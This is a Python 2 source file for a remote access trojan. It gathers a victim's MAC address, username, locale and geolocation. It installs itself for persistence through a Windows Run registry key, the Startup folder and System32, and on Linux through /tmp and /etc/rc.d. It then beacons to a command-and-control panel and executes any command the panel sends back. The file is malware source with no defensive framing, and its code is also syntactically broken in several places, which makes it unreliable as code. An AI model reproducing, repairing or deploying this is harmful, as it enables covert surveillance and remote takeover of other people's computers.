#!/usr/bin/python

import os, getpass, requests, json, locale, time, sys, ctypes
from uuid import getnode as get_mac
from _winreg import *
from re import search

mac = get_mac()
uname = getpass.getuser()
send_url = 'http://freegeoip.net/json'
r = requests.get(send_url)
info = json.loads(r.text)

geo_r = requests.get(send_url)
geo_json = geo_r.json()
latLong = [geo_json["latitude"], geo_json["longitude"]]

lang = locale.getdefaultlocale() #Get local PC language
typeos = os.name #Type of Operating System
sleep = 300   #Time between POSTS to server
cmdTime = 150 #Half the sleep time
timecheck = time.time()
persistWin = "C:\\\\Program Data\\Microsoft\\Windows\Start Menu\\Programs\\Startup\\"+ sys.argv[0] #Windows persistence file
persistLin = "/tmp/"+sys.argv[0] #Linux persistence file
page = "/api.php" #Landing page

url = 'SOME URL' #Panel URL

headers = {
    'User-Agent:' 'D4rkSmil3' #Custom panel UA for some protection
}

data = {
	'mac: %r uname: %r lang: %r info: %r location: %r online: online' % (mac, uname, lang, info, latLong)
}

#response = requests.post(url, headers=headers, data=data)

def isinfected(): #Detects OS then checks if PC is infected and if so it runs normally otherwise it inputs to startup and a second backup directory
  if (typeos=='posix'):
    if (os.path.exists('/tmp/'+uname)==True):
      pass
    else:
      pass
      os.system('sudo mv '+sys.argv[0]+' /tmp/'+uname+'&& chmod 755 '+uname+' && screen ./'+uname)
      os.system('sudo mv '+sys.argv[0]+' /etc/rc.d/'+uname+' && chmod 755 '+uname)
  elif (typeos=='nt'):
     isadmin = ctypes.windll.shell32.IsUserAnAdmin() !=0 #Admin check
     if(isadmin == 'False') #If not admin puts in appdata/roaming
	  if (os.path.exists('%APPDATA%\\'+uname+'.exe')==True):
        pass
      elif (os.path.exists('%APPDATA%\\'+uname+'.exe')==False):
	    aReg = ConnectRegistry(None,HKEY_CURRENT_USER) #Setup RegKey
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE) #Open RegKey
        try:   
           SetValueEx(aKey,"SandSpirit",0, REG_SZ, r"%APPDATA%\\"+uname+".exe") #Set RegKey
        except EnvironmentError:                                          
            pass
        CloseKey(aKey)
        CloseKey(aReg) 
        os.rename(sys.argv[0], '%APPDATA%\\'+uname+'.exe')
        os.system('%APPDATA%\\'+uname+'.exe')
        os.rename(sys.argv[0], '%APPDATA%\\'+uname+'.exe')
	 else #If is admin puts in sys32 directory
      if (os.path.exists('C://Windows/System32/'+uname+'.exe')==True):
        pass
      elif (os.path.exists('C://Windows/System32/'+uname+'.exe')==False):
	  	    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        try:   
           SetValueEx(aKey,"SandSpirit",0, REG_SZ, r"C://Windows/System32/"+uname+".exe") 
        except EnvironmentError:                                          
            pass
        CloseKey(aKey)
        CloseKey(aReg)
        os.rename(sys.argv[0], 'C://Windows/System32/'+uname+'.exe')
        os.system('C://Windows/System32/'+uname+'.exe')
        os.rename(sys.argv[0], 'C://ProgramData/Microsoft/Windows/Start%20Menu/Programs/Startup/'+uname+'.exe')

def cmd(data): #Runs system command via python
    msg = data.split('CMD')
    msg = msg[1].split('\r\n')
    os.system(msg[0])
	
def finalDirectory(file):
	drive = os.path.dirname(file)
	if (len(drive) == 3 or len(drive) == 4)
	  pass
	return finalDirectory(drive)

isinfected()

while True: #Main loop to post data to server and recieve commands
  if timecheck+sleep > time.time():
    requests.post(url, headers=headers, data=data)
  else:
    time.sleep(cmdTime)
    r = requests.get(url+page, headers=headers)
    data = r.text
    if search("CMD", data):
      cmd(data)
    else:
      pass

#name = raw_input("Your name please: ")
#print 'My public IP address is:', ip
#print mac
#print uname
#print lang
#print latLong
